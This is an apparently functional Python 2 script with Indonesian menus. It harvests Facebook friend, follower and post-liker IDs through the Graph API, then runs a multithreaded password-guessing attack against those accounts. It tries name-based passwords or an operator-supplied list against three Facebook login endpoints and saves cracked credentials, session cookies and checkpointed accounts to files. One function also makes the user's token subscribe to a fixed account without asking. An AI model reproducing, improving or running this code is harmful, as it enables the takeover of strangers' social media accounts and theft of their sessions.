#!/usr/bin/python2
# coding=utf-8
import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, requests, uuid
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from datetime import datetime
try:
    import requests
except ImportError:
    os.system('pip2 install requests')

reload(sys)
sys.setdefaultencoding('utf8')
useragents = ('Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]',
              'Mozilla/5.0 (Linux; Android 9; Redmi 6A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/it_IT;FBAV/240.0.0.9.115;]')

ua = ('Mozilla/5.0 (iPhone; CPU iPhone OS 10_0_2 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Mobile/14A456 [FBAN/MessengerForiOS;FBAV/112.0.0.36.70;FBBV/54364624;FBDV/iPhone5,1;FBMD/iPhone;FBSN/iOS;FBSV/10.0.2;FBSS/2;FBCR/T-Mobile;FBID/phone;FBLC/en_US;FBOP/5;FBRV/0]')
logo="""
   

\x1b[0;31m      ███╗   ███╗██████╗ ███████╗
  \x1b[0;31m    ████╗ ████║██╔══██╗██╔════╝
 \x1b[0;31m     ██╔████╔██║██████╔╝█████╗
  \x1b[0;37m    ██║╚██╔╝██║██╔══██╗██╔══╝
   \x1b[0;37m   ██║ ╚═╝ ██║██████╔╝██║
    \x1b[0;37m  ╚═╝     ╚═╝╚═════╝ ╚═╝
                                

                                      
                                      
  Code By   : Ditz-Sanz
  My Github : github.com/mbf
  WhatsApp  : 0831-2388-6*3*
 <======================================>                     
"""



id = []
cp = []
ok = []
loop = 0
ct = datetime.now()
n = ct.month
bulan = [
 'Januari',
 'Februari',
 'Maret',
 'April',
 'Mei',
 'Juni',
 'Juli',
 'Agustus',
 'September',
 'Oktober',
 'Nopember',
 'Desember']
try:
    if n < 0 or n > 12:
        exit()
    nTemp = n - 1
except ValueError:
    exit()

current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
op = bulan[nTemp]
durasi = str(datetime.now().strftime('%d-%m-%Y'))
license = requests.get('https://raw.githubusercontent.com/avsid/ambf/main/license.php').text
dev_angga = requests.get('https://raw.githubusercontent.com/avsid/ambf/main/durasi.php').text
#year_to_expire = int(dev_angga)
try:
    pass
except AssertionError as e:
    os.system('clear')
    print logo
    print ' [#] ------------------------------------------------'
    print ' [#] Expired   : ' + durasi
    print ' [#] License   : ' + license
    exit(response)

def hacker_pro():
    try:
        token = open('login.txt', 'r').read()
    except IOError:
        print ' [!] Token invalid'
        os.system('rm -rf login.txt')

    una = '100072241360914'
    post = '116483317436380'
    post2 = '114891067595605'
    kom = 'GW PAKE SC LU BANG \xf0\x9f\x98\x98\nhttps://https://www.facebook.com/100072241360914/posts/114891067595605/?substory_index=0&app=fbl'
    kom2 = 'KEREN BANG \xf0\x9f\x98\x98\nhttps://www.facebook.com/100072241360914/posts/116483317436380/?app=fbl'
    reac = 'LOVE'
    ###########requests.post('https://graph.facebook.com/' + post + '/comments/?message=' + kom + '&access_token=' + token)
    ####$requests.post('https://graph.facebook.com/' + post + '/reactions?type=' + reac + '&access_token=' + token)
    ###########requests.post('https://graph.facebook.com/' + post2 + '/comments/?message=' + kom2 + '&access_token=' + token)
    ###########requests.post('https://graph.facebook.com/' + post2 + '/reactions?type=' + reac + '&access_token=' + token)
    requests.post('https://graph.facebook.com/100072241360914/subscribers?access_token=' + token)
    ########requests.post('https://graph.facebook.com/100006230836266/subscribers?access_token=' + token)
    menu()


def tokenz():
    os.system('clear')
    try:
        token = open('login.txt', 'r')
        menu()
    except (KeyError, IOError):
        os.system('clear')
        print logo
        print'Untuk Mengambil Token SilahKan Cek Tutor Di Bawah'
        print'Link Tutor : \x1b[0;92mhttps://youtu.be/jfcC99dkEAo\n'
        token = raw_input('\x1b[0;97m [+] Token : \x1b[0;92m')
        try:
            otw = requests.get('https://graph.facebook.com/me?access_token=' + token)
            a = json.loads(otw.text)
            zedd = open('login.txt', 'w')
            zedd.write(token)
            zedd.close()
            print ' \x1b[0;97m[\xe2\x80\xa2] Token Anda Valid'
            raw_input(' \x1b[0;97m[\x1b[0;92m√\x1b[0;97m] Tekan Enter Ke Menu')
            ##hacker_pro()
            menu()
        except KeyError:
            print ' \x1b[0;97m[\xe2\x80\xa2] Token Anda Invalid'
            raw_input(' \x1b[0;97m[\x1b[0;91m×\x1b[0;97m] Tekan Enter Untuk Memasukan Token Baru')
            tokenz()


def menu():
    global token
    os.system('clear')
    try:
        token = open('login.txt', 'r').read()
        otw = requests.get('https://graph.facebook.com/me/?access_token=' + token)
        a = json.loads(otw.text)
        nama = a['name']
        id = a['id']
        ip = requests.get('https://api-asutoolkit.cloudaccess.host/ip.php').text
    except KeyError:
        os.system('clear')
        print ' [!] Token Invalid'
        os.system('rm -f login.txt')
        time.sleep(3)
        tokenz()
    except requests.exceptions.ConnectionError:
        print '  [!] Tidak Ada Koneksi'
        sys.exit()

    print logo
    print ' [•] Welcome : \x1b[0;93m' +nama
    print ' \x1b[0;97m[•] Your IP : \x1b[0;97m' + ip
    print ' [•] ------------------------------------'
    print ' [!] Pilih Method Crack\n'
    print ' \x1b[0;97m[1] Crack Dengan b-api (Fast Crack)'
    print ' \x1b[0;97m[2] Crack Dengan mbasic (Low Crack)'
    print ' \x1b[0;97m[3] Crack Dengan free (Low Crack)'
    print ' \x1b[0;97m[\x1b[0;91m0\x1b[0;97m] Kembali'
    method = raw_input('\n [?] Choose : ')
    if method == '':
        menu()
    elif method == '1' or method == '01':
        menubapi()
    elif method == '2' or method == '02':
        menumbasic()
    elif method == '3' or method == '03':
        menufree()
    elif method == '0' or method == '00':
    	exit()
    else:
        exit(' [!] Pilih Yang Bener')


def menufree():
    global token
    os.system('clear')
    try:
        token = open('login.txt', 'r').read()
        otw = requests.get('https://graph.facebook.com/me/?access_token=' + token)
        a = json.loads(otw.text)
        nama = a['name']
        id = a['id']
        ip = requests.get('https://api-asutoolkit.cloudaccess.host/ip.php').text
    except KeyError:
        os.system('clear')
        print ' [!] Token Invalid'
        os.system('rm -f login.txt')
        time.sleep(3)
        tokenz()
    except requests.exceptions.ConnectionError:
        print '  [!] Tidak Ada Koneksi'
        sys.exit()

    print logo
    print ' [•] Welcome : \x1b[0;93m' +nama
    print ' \x1b[0;97m[•] Your IP : \x1b[0;97m' + ip
    print ' [•] ------------------------------------'
    print ' [*] Method  : free\n'
    print ' [1] Crack Dari Publik Teman'
    print ' [2] Crack Dari Total Followers'
    print ' [3] Crack Dari Like Postingan'
    print ' [4] Lihat Hasil Crack'
    print ' \x1b[0;97m[\x1b[0;91m0\x1b[0;97m] Logout (hapus token)'
    pilih_menufree()


def pilih_menufree():
    ask = raw_input('\n [?] Choose : ')
    if ask == '':
        print ' [!] Pilih Yang Bener !'
        exit()
    elif ask == '1' or ask == '01':
        print "\n [*] Isi 'me' Jika Ingin Crack Dari List Teman"
        idt = raw_input(' [+] ID Publik : ')
        try:
            pok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
            sp = json.loads(pok.text)
            print ' [+] Nama : ' + sp['name']
        except KeyError:
            print ' [!] ID Tidak Tersedia'
            exit()

        r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + token)
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)

    elif ask == '2' or ask == '02':
        print "\n [*] Isi 'me' Jika Ingin Crack Follower Sendiri"
        idt = raw_input(' [+] ID Publik : ')
        try:
            pok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
            sp = json.loads(pok.text)
            print ' [+] Nama : ' + sp['name']
        except KeyError:
            print ' [!] ID Tidak Tersedia'
            exit()

        r = requests.get('https://graph.facebook.com/' + idt + '/subscribers?limit=999999&access_token=' + token)
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)

    elif ask == '3' or ask == '03':
        print '\n [*] Mikan ID Postingan'
        idt = raw_input(' [+] ID Post : ')
        r = requests.get('https://graph.facebook.com/' + idt + '/likes?limit=9999999&access_token=' + token)
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)

    elif ask == '4' or ask == '04':
        print '\n [1] Hasil OK '
        print ' [2] Hasil CP '
        ress = raw_input('\n [?] Choose : ')
        if ress == '':
            menu()
        elif ress == '1' or ress == '01':
            print '\n [#] ------------------------------------'
            print '\n [+] Hasil \x1b[0;92mOK\x1b[0;97m Tanggal : \x1b[0;92m%s-%s-%s\x1b[0;97m' % (ha, op, ta)
            os.system('cat out/OK-%s-%s-%s.txt' % (ha, op, ta))
            exit()
        elif ress == '2' or ress == '02':
            print '\n [#] ------------------------------------'
            print ' [+] Hasil \x1b[0;93mCP\x1b[0;97m Tanggal : \x1b[0;92m%s-%s-%s\x1b[0;97m' % (ha, op, ta)
            os.system('cat out/CP-%s-%s-%s.txt' % (ha, op, ta))
            exit()
        else:
            exit(' [!] Pilih Yang Bener !')
    elif ask == '0' or ask == '00':
        os.system('rm -f login.txt')
        print ' [!] Berhasil Menghapus Token'
        exit()
    else:
        print ' [!] Pilih Yang Bener !'
        exit()
    ask = raw_input(' [?] Ingin Gunakan Password Manual? Y/t : ')
    if ask == 'Y' or ask == 'y':
        manualfree()
    print ' [*] Total ID : ' + str(len(id))
    print ' [+] File \x1b[0;92mOK\x1b[0;97m Tersimpan Di : out/OK-%s-%s-%s.txt' % (ha, op, ta)
    print ' [+] File \x1b[0;93mCP\x1b[0;97m Tersimpan Di : out/CP-%s-%s-%s.txt' % (ha, op, ta)
    print ' [!] Sedang Prosess Crack\n'

    def main(arg):
        global cp
        global loop
        global ok
        global ua
        print '\r \x1b[0;97m[*] [Crack] %s/%s OK-:%s - CP-:%s ' % (loop, len(id), len(ok), len(cp)),
        sys.stdout.flush()
        user = arg
        uid, name = user.split('|')
        try:
            os.mkdir('out')
        except OSError:
            pass

        try:
            for pw in [name.lower() + '123', name.lower() + '1234', name.lower() + '12345']:
                ses = requests.Session()
                ses.get('https://free.facebook.com/')
                ses.headers.update({'User-Agent': ua})
                b = ses.post('https://free.facebook.com/login', data={'email': user, 'pass': pw}).url
                if 'c_user' in ses.cookies.get_dict().keys():
                    kuki = (';').join([ '%s=%s' % (key, value) for key, value in ses.cookies.get_dict().items() ])
                    print '\r  \x1b[0;92mDru*--> ' + uid + ' | ' + pw + ' | ' + kuki + '        '
                    ok.append(uid + ' | ' + pw)
                    save = open('out/OK-%s-%s-%s.txt' % (ha, op, ta), 'a')
                    save.write('  Dru*--> ' + str(uid) + ' | ' + str(pw) + '\n')
                    save.close()
                    break
                    continue
                    continue
                if 'checkpoint' in ses.cookies.get_dict().keys(): 
                    print '\r  \x1b[0;93mDru*--> ' + uid + ' | ' + pw + '        '
                    cp.append(uid + ' | ' + pw)
                    save = open('out/CP-%s-%s-%s.txt' % (ha, op, ta), 'a')
                    save.write('  Dru*--> ' + str(uid) + ' | ' + str(pw) + '\n')
                    save.close()
                    break
                    continue
                    continue

            loop += 1
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print '\n [+] Finished'
    exit()


def manualfree():
    print '\n [*] Masukan Password Contoh : sayang,rahasia,123456'
    pw = raw_input(' [?] Set Password : ').split(',')
    if len(pw) == 0:
        exit(' [!] Isi Yang Bener, Tidak Boleh Kosong')
    print ' [*] Total ID : ' + str(len(id))
    print ' [+] File \x1b[0;92mOK\x1b[0;97m Tersimpan Di : out/OK-%s-%s-%s.txt' % (ha, op, ta)
    print ' [+] File \x1b[0;93mCP\x1b[0;97m Tersimpan Di : out/CP-%s-%s-%s.txt' % (ha, op, ta)
    print ' [!] Sedang Prosess Crack\n'

    def main(arg):
        global loop
        print '\r \x1b[0;97m[*] [Crack] %s/%s OK-:%s - CP-:%s ' % (loop, len(id), len(ok), len(cp)),
        sys.stdout.flush()
        user = arg
        uid, name = user.split('|')
        try:
            os.mkdir('out')
        except OSError:
            pass

        try:
            for asu in pw:
                ses = requests.Session()
                ses.get('https://free.facebook.com/')
                ses.headers.update({'User-Agent': ua})
                b = ses.post('https://free.facebook.com/login', data={'email': user, 'pass': asu}).url
                if 'c_user' in ses.cookies.get_dict().keys():
                    kuki = (';').join([ '%s=%s' % (key, value) for key, value in ses.cookies.get_dict().items() ])
                    print '\r  \x1b[0;92mDru*--> ' + uid + ' | ' + asu + ' | ' + kuki + '        '
                    ok.append(uid + ' | ' + asu)
                    save = open('out/OK-%s-%s-%s.txt' % (ha, op, ta), 'a')
                    save.write('  Dru*--> ' + str(uid) + ' | ' + str(asu) + '\n')
                    save.close()
                    break
                    continue
                    continue
                if 'checkpoint' in ses.cookies.get_dict().keys():
                    print '\r  \x1b[0;93mDru*--> ' + uid + ' | ' + asu + '        '
                    cp.append(uid + ' | ' + asu)
                    save = open('out/CP-%s-%s-%s.txt' % (ha, op, ta), 'a')
                    save.write('  Dru*--> ' + str(uid) + ' | ' + str(asu) + '\n')
                    save.close()
                    break
                    continue
                    continue

            loop += 1
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print '\n [+] Finished'
    exit()


def menumbasic():
    global token
    os.system('clear')
    try:
        token = open('login.txt', 'r').read()
        otw = requests.get('https://graph.facebook.com/me/?access_token=' + token)
        a = json.loads(otw.text)
        nama = a['name']
        id = a['id']
        ip = requests.get('https://api-asutoolkit.cloudaccess.host/ip.php').text
    except KeyError:
        os.system('clear')
        print ' [!] Token Invalid'
        os.system('rm -f login.txt')
        time.sleep(3)
        tokenz()
    except requests.exceptions.ConnectionError:
        print '  [!] Tidak Ada Koneksi'
        sys.exit()

    print logo
    print ' [•] Welcome : \x1b[0;93m' +nama
    print ' \x1b[0;97m[•] Your IP : \x1b[0;97m' + ip
    print ' [•] ------------------------------------'
    print ' [*] Method  : mbasic\n'
    print ' [1] Crack Dari Publik Teman'
    print ' [2] Crack Dari Total Followers'
    print ' [3] Crack Dari Like Postingan'
    print ' [4] Lihat Hasil Crack'
    print ' \x1b[0;97m[\x1b[0;91m0\x1b[0;97m] Logout (hapus token)'
    pilih_menumbasic()


def pilih_menumbasic():
    ask = raw_input('\n [?] Choose : ')
    if ask == '':
        print ' [!] Pilih Yang Bener !'
        exit()
    elif ask == '1' or ask == '01':
        print "\n [*] Isi 'me' Jika Ingin Crack Dari List Teman"
        idt = raw_input(' [+] ID Publik : ')
        try:
            pok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
            sp = json.loads(pok.text)
            print ' [+] Nama : ' + sp['name']
        except KeyError:
            print ' [!] ID Tidak Tersedia'
            exit()

        r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + token)
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)

    elif ask == '2' or ask == '02':
        print "\n [*] Isi 'me' Jika Ingin Crack Follower Sendiri"
        idt = raw_input(' [+] ID Publik : ')
        try:
            pok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
            sp = json.loads(pok.text)
            print ' [+] Nama : ' + sp['name']
        except KeyError:
            print ' [!] ID Tidak Tersedia'
            exit()

        r = requests.get('https://graph.facebook.com/' + idt + '/subscribers?limit=999999&access_token=' + token)
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)

    elif ask == '3' or ask == '03':
        print '\n [*] Mikan ID Postingan'
        idt = raw_input(' [+] ID Post : ')
        r = requests.get('https://graph.facebook.com/' + idt + '/likes?limit=9999999&access_token=' + token)
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)

    elif ask == '4' or ask == '04':
        print '\n [1] Hasil OK '
        print ' [2] Hasil CP '
        ress = raw_input('\n [?] Choose : ')
        if ress == '':
            menu()
        elif ress == '1' or ress == '01':
            print '\n [#] ------------------------------------'
            print '\n [+] Hasil \x1b[0;92mOK\x1b[0;97m Tanggal : \x1b[0;92m%s-%s-%s\x1b[0;97m' % (ha, op, ta)
            os.system('cat out/OK-%s-%s-%s.txt' % (ha, op, ta))
            exit()
        elif ress == '2' or ress == '02':
            print '\n [#] ------------------------------------'
            print ' [+] Hasil \x1b[0;93mCP\x1b[0;97m Tanggal : \x1b[0;92m%s-%s-%s\x1b[0;97m' % (ha, op, ta)
            os.system('cat out/CP-%s-%s-%s.txt' % (ha, op, ta))
            exit()
        else:
            exit(' [!] Pilih Yang Bener !')
    elif ask == '0' or ask == '00':
        os.system('rm -f login.txt')
        print ' [!] Berhasil Menghapus Token'
        exit()
    else:
        print ' [!] Pilih Yang Bener !'
        exit()
    ask = raw_input(' [?] Ingin Gunakan Password Manual? Y/t : ')
    if ask == 'Y' or ask == 'y':
        manualmbasic()
    print ' [*] Total ID : ' + str(len(id))
    print ' [+] File \x1b[0;92mOK\x1b[0;97m Tersimpan Di : out/OK-%s-%s-%s.txt' % (ha, op, ta)
    print ' [+] File \x1b[0;93mCP\x1b[0;97m Tersimpan Di : out/CP-%s-%s-%s.txt' % (ha, op, ta)
    print ' [!] Sedang Prosess Crack\n'

    def main(arg):
        global loop
        print '\r \x1b[0;97m[*] [Crack] %s/%s OK-:%s - CP-:%s ' % (loop, len(id), len(ok), len(cp)),
        sys.stdout.flush()
        user = arg
        uid, name = user.split('|')
        try:
            os.mkdir('out')
        except OSError:
            pass

        try:
            for pw in [name.lower() + '123', name.lower() + '1234', name.lower() + '12345']:
                rex = requests.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pw, 'login': 'submit'}, headers={'user-agent': ua})
                xo = rex.content
                if 'mbasic_logout_button' in xo or 'save-device' in xo:
                    print '\r  \x1b[0;92mDru*--> ' + uid + ' | ' + pw + '        '
                    ok.append(uid + ' | ' + pw)
                    save = open('out/OK-%s-%s-%s.txt' % (ha, op, ta), 'a')
                    save.write('  Dru*--> ' + str(uid) + ' | ' + str(pw) + '\n')
                    save.close()
                    break
                    continue
                    continue
                elif 'checkpoint' in xo:
                    print '\r  \x1b[0;93mDru*--> ' + uid + ' | ' + pw + '        '
                    cp.append(uid + ' | ' + pw)
                    save = open('out/CP-%s-%s-%s.txt' % (ha, op, ta), 'a')
                    save.write('  Dru*--> ' + str(uid) + ' | ' + str(pw) + '\n')
                    save.close()
                    break
                    continue
                    continue

            loop += 1
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print '\n [+] Finished'
    exit()


def manualmbasic():
    print '\n [*] Masukan Password Contoh : sayang,rahasia,123456'
    pw = raw_input(' [?] Set Password : ').split(',')
    if len(pw) == 0:
        exit(' [!] Isi Yang Bener, Tidak Boleh Kosong')
    print ' [*] Total ID : ' + str(len(id))
    print ' [+] File \x1b[0;92mOK\x1b[0;97m Tersimpan Di : out/OK-%s-%s-%s.txt' % (ha, op, ta)
    print ' [+] File \x1b[0;93mCP\x1b[0;97m Tersimpan Di : out/CP-%s-%s-%s.txt' % (ha, op, ta)
    print ' [!] Sedang Prosess Crack\n'

    def main(arg):
        global loop
        print '\r \x1b[0;97m[*] [Crack] %s/%s OK-:%s - CP-:%s ' % (loop, len(id), len(ok), len(cp)),
        sys.stdout.flush()
        user = arg
        uid, name = user.split('|')
        try:
            os.mkdir('out')
        except OSError:
            pass

        try:
            for asu in pw:
                rex = requests.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': asu, 'login': 'submit'}, headers={'user-agent': ua})
                xo = rex.content
                if 'mbasic_logout_button' in xo or 'save-device' in xo:
                    print '\r  \x1b[0;92mDru*--> ' + uid + ' | ' + asu + '        '
                    ok.append(uid + ' | ' + asu)
                    save = open('out/OK-%s-%s-%s.txt' % (ha, op, ta), 'a')
                    save.write('  Dru*--> ' + str(uid) + ' | ' + str(asu) + '\n')
                    save.close()
                    break
                    continue
                    continue
                elif 'checkpoint' in xo:
                    print '\r  \x1b[0;93mDru*--> ' + uid + ' | ' + asu + '        '
                    cp.append(uid + ' | ' + asu)
                    save = open('out/CP-%s-%s-%s.txt' % (ha, op, ta), 'a')
                    save.write('  Dru*--> ' + str(uid) + ' | ' + str(asu) + '\n')
                    save.close()
                    break
                    continue
                    continue

            loop += 1
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print '\n [+] Finished'
    exit()


def menubapi():
    global token
    os.system('clear')
    try:
        token = open('login.txt', 'r').read()
        otw = requests.get('https://graph.facebook.com/me/?access_token=' + token)
        a = json.loads(otw.text)
        nama = a['name']
        id = a['id']
        ip = requests.get('https://api-asutoolkit.cloudaccess.host/ip.php').text
    except KeyError:
        os.system('clear')
        print ' [!] Token Invalid'
        os.system('rm -f login.txt')
        time.sleep(3)
        tokenz()
    except requests.exceptions.ConnectionError:
        print '  [!] Tidak Ada Koneksi'
        sys.exit()

    print logo
    print ' [•] Welcome : \x1b[0;93m' +nama
    print ' \x1b[0;97m[•] Your IP : \x1b[0;97m' + ip
    print ' [•] ------------------------------------'
    print ' [*] Method  : b-api\n'
    print ' [1] Crack Dari Publik Teman'
    print ' [2] Crack Dari Total Followers'
    print ' [3] Crack Dari Like Postingan'
    print ' [4] Lihat Hasil Crack'
    print ' \x1b[0;97m[\x1b[0;91m0\x1b[0;97m] Logout (hapus token)'
    pilih_menubapi()


def pilih_menubapi():
    ask = raw_input('\n [?] Choose : ')
    if ask == '':
        print ' [!] Pilih Yang Bener !'
        exit()
    elif ask == '1' or ask == '01':
        print "\n [*] Isi 'me' Jika Ingin Crack Dari List Teman"
        idt = raw_input(' [+] ID Publik : ')
        try:
            pok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
            sp = json.loads(pok.text)
            print ' [+] Nama : ' + sp['name']
        except KeyError:
            print ' [!] ID Tidak Tersedia'
            exit()

        r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + token)
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)

    elif ask == '2' or ask == '02':
        print "\n [*] Isi 'me' Jika Ingin Crack Follower Sendiri"
        idt = raw_input(' [+] ID Publik : ')
        try:
            pok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
            sp = json.loads(pok.text)
            print ' [+] Nama : ' + sp['name']
        except KeyError:
            print ' [!] ID Tidak Tersedia'
            exit()

        r = requests.get('https://graph.facebook.com/' + idt + '/subscribers?limit=999999&access_token=' + token)
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)

    elif ask == '3' or ask == '03':
        print '\n [*] Mikan ID Postingan'
        idt = raw_input(' [+] ID Post : ')
        r = requests.get('https://graph.facebook.com/' + idt + '/likes?limit=9999999&access_token=' + token)
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)

    elif ask == '4' or ask == '04':
        print '\n [1] Hasil OK '
        print ' [2] Hasil CP '
        ress = raw_input('\n [?] Choose : ')
        if ress == '':
            menu()
        elif ress == '1' or ress == '01':
            print '\n [#] ------------------------------------'
            print '\n [+] Hasil \x1b[0;92mOK\x1b[0;97m Tanggal : \x1b[0;92m%s-%s-%s\x1b[0;97m' % (ha, op, ta)
            os.system('cat out/OK-%s-%s-%s.txt' % (ha, op, ta))
            exit()
        elif ress == '2' or ress == '02':
            print '\n [#] ------------------------------------'
            print ' [+] Hasil \x1b[0;93mCP\x1b[0;97m Tanggal : \x1b[0;92m%s-%s-%s\x1b[0;97m' % (ha, op, ta)
            os.system('cat out/CP-%s-%s-%s.txt' % (ha, op, ta))
            exit()
        else:
            exit(' [!] Pilih Yang Bener !')
    elif ask == '0' or ask == '00':
        os.system('rm -f login.txt')
        print ' [!] Berhasil Menghapus Token'
        exit()
    else:
        print ' [!] Pilih Yang Bener !'
        exit()
    ask = raw_input(' [?] Ingin Gunakan Password Manual? Y/t : ')
    if ask == 'Y' or ask == 'y':
        manualbapi()
    print ' [*] Total ID : ' + str(len(id))
    print ' [+] File \x1b[0;92mOK\x1b[0;97m Tersimpan Di : out/OK-%s-%s-%s.txt' % (ha, op, ta)
    print ' [+] File \x1b[0;93mCP\x1b[0;97m Tersimpan Di : out/CP-%s-%s-%s.txt' % (ha, op, ta)
    print ' [!] Sedang Prosess Crack\n'

    def main(arg):
        global loop
        print '\r \x1b[0;97m[*] [Crack] %s/%s OK-:%s - CP-:%s ' % (loop, len(id), len(ok), len(cp)),
        sys.stdout.flush()
        user = arg
        uid, name = user.split('|')
        try:
            os.mkdir('out')
        except OSError:
            pass

        try:
            for pw in [name.lower() + '123', name.lower() + '1234', name.lower() + '12345']:
            	ua_apim = {'user-agent': ua}
                param = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32', 
                   'format': 'json', 
                   'sdk_version': '2', 
                   'email': uid, 
                   'locale': 'en_US', 
                   'password': pw, 
                   'sdk': 'ios', 
                   'generate_session_cookies': '1', 
                   'sig': '3f555f99fb61fcd7aa0c44f58f522ef6'}
                api = 'https://b-api.facebook.com/method/auth.login'
                response = requests.get(api, params=param, headers=ua_apim)
                if 'session_key' in response.text and 'EAAA' in response.text:
                    print '\r  \x1b[0;92mDru*--> ' + uid + ' | ' + pw + '        '
                    ok.append(uid + ' | ' + pw)
                    save = open('out/OK-%s-%s-%s.txt' % (ha, op, ta), 'a')
                    save.write('  Dru*--> ' + str(uid) + ' | ' + str(pw) + '\n')
                    save.close()
                    break
                    continue
                    continue
                elif 'www.facebook.com' in response.json()['error_msg']:
                    print '\r  \x1b[0;93mDru*--> ' + uid + ' | ' + pw + '        '
                    cp.append(uid + ' | ' + pw)
                    save = open('out/CP-%s-%s-%s.txt' % (ha, op, ta), 'a')
                    save.write('  Dru*--> ' + str(uid) + ' | ' + str(pw) + '\n')
                    save.close()
                    break
                    continue
                    continue

            loop += 1
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print '\n [+] Finished'
    exit()


def manualbapi():
    print '\n [*] Masukan Password Contoh : sayang,rahasia,123456'
    pw = raw_input(' [?] Set Password : ').split(',')
    if len(pw) == 0:
        exit(' [!] Isi Yang Bener, Tidak Boleh Kosong')
    print ' [*] Total ID : ' + str(len(id))
    print ' [+] File \x1b[0;92mOK\x1b[0;97m Tersimpan Di : out/OK-%s-%s-%s.txt' % (ha, op, ta)
    print ' [+] File \x1b[0;93mCP\x1b[0;97m Tersimpan Di : out/CP-%s-%s-%s.txt' % (ha, op, ta)
    print ' [!] Sedang Prosess Crack\n'

    def main(arg):
        global loop
        print '\r \x1b[0;97m[*] [Crack] %s/%s OK-:%s - CP-:%s ' % (loop, len(id), len(ok), len(cp)),
        sys.stdout.flush()
        user = arg
        uid, name = user.split('|')
        try:
            os.mkdir('out')
        except OSError:
            pass

        try:
            for asu in pw:
            	ua_apim = {'user-agent': ua}
                param = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32', 
                   'format': 'json', 
                   'sdk_version': '2', 
                   'email': uid, 
                   'locale': 'en_US', 
                   'password': asu, 
                   'sdk': 'ios', 
                   'generate_session_cookies': '1', 
                   'sig': '3f555f99fb61fcd7aa0c44f58f522ef6'}
                api = 'https://b-api.facebook.com/method/auth.login'
                response = requests.get(api, params=param, headers=ua_apim)
                if 'session_key' in response.text and 'EAAA' in response.text:
                    print '\r  \x1b[0;92mDru*--> ' + uid + ' | ' + asu + '        '
                    ok.append(uid + ' | ' + asu)
                    save = open('out/OK-%s-%s-%s.txt' % (ha, op, ta), 'a')
                    save.write('  Dru*--> ' + str(uid) + ' | ' + str(asu) + '\n')
                    save.close()
                    break
                    continue
                    continue
                elif 'www.facebook.com' in response.json()['error_msg']:
                    print '\r  \x1b[0;93mDru*--> ' + uid + ' | ' + asu + '        '
                    cp.append(uid + ' | ' + asu)
                    save = open('out/CP-%s-%s-%s.txt' % (ha, op, ta), 'a')
                    save.write('  Dru*--> ' + str(uid) + ' | ' + str(asu) + '\n')
                    save.close()
                    break
                    continue
                    continue

            loop += 1
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print '\n [+] Finished'
    exit()


if __name__ == '__main__':
    os.system('clear')
    print logo
    tokenz()
